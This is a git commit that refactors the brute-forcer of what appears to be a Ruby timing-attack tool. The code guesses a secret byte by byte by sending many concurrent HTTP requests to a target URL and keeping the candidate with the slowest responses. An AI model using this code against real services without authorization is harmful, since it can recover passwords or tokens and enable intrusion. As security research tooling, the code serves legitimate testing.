12e1e7a9fefba858a29dc79e8a721b9edf513a2c
Forrest Fleming <ffleming@gmail.com>
2017-02-04 11:00:53 -0800

    extract methods

--- lib/timing_attack/brute_forcer.rb
+++ lib/timing_attack/brute_forcer.rb
@@ -7,52 +7,65 @@ module TimingAttack
       raise ArgumentError.new("Must provide :url key") if url.nil?
       @concurrency = options.fetch(:concurrency, 3)
       @iterations = options.fetch(:iterations, 20)
+      @known = ""
     end
 
     private
 
-    BYTES = (' '..'z').to_a
+    attr_reader :known
+    POTENTIAL_BYTES = (' '..'z').to_a
     def attack!
-      known = ""
       while(true)
-        attacks = BYTES.map do |byte|
-          TimingAttack::TestCase.new(input: "#{known}#{byte}",
-                                      options: options)
-        end
-        hydra = Typhoeus::Hydra.new(max_concurrency: concurrency)
-        iterations.times do
-          attacks.each do |attack|
-            req = attack.generate_hydra_request!
-            req.on_complete do |response|
-              print "\r#{' ' * (known.length + 4)}"
-              output.increment
-              print "'#{known}'"
-            end
-            hydra.queue req
-          end
-        end
-        hydra.run
-        attacks.each(&:process!)
-        grouper = Grouper.new(attacks: attacks, group_by: { percentile: 3 })
-        results = grouper.long_tests.map(&:input)
-        if grouper.long_tests.count > 1
-          raise StandardError.new("Got too many possibilities: #{results.join(', ')}")
-        end
-        known = results.first
+        attack_byte!
       end
     end
-  end
 
-  def output
-    @output ||= TimingAttack::Spinner.new
-  end
+    def attack_byte!
+      @attacks = POTENTIAL_BYTES.map do |byte|
+        TimingAttack::TestCase.new(input: "#{known}#{byte}",
+                                   options: options)
+      end
+      run_attacks!
+      process_attacks!
+    end
 
-  DEFAULT_OPTIONS = {
-    verbose: true,
-    method: :get,
-    iterations: 50,
-    mean: false,
-    percentile: 3,
-    concurrency: 15,
-  }.freeze
+    def run_attacks!
+      hydra = Typhoeus::Hydra.new(max_concurrency: concurrency)
+      iterations.times do
+        attacks.each do |attack|
+          req = attack.generate_hydra_request!
+          req.on_complete do |response|
+            print "\r#{' ' * (known.length + 4)}"
+            output.increment
+            print " '#{known}'"
+          end
+          hydra.queue req
+        end
+      end
+      hydra.run
+    end
+
+    def process_attacks!
+      attacks.each(&:process!)
+      grouper = Grouper.new(attacks: attacks, group_by: { percentile: options.fetch(:percentile) })
+      results = grouper.long_tests.map(&:input)
+      if grouper.long_tests.count > 1
+        raise StandardError.new("Got too many possibilities: #{results.join(', ')}")
+      end
+      @known = results.first
+    end
+
+    def output
+      @output ||= TimingAttack::Spinner.new
+    end
+
+    DEFAULT_OPTIONS = {
+      verbose: true,
+      method: :get,
+      iterations: 50,
+      mean: false,
+      percentile: 3,
+      concurrency: 15,
+    }.freeze
+  end
 end
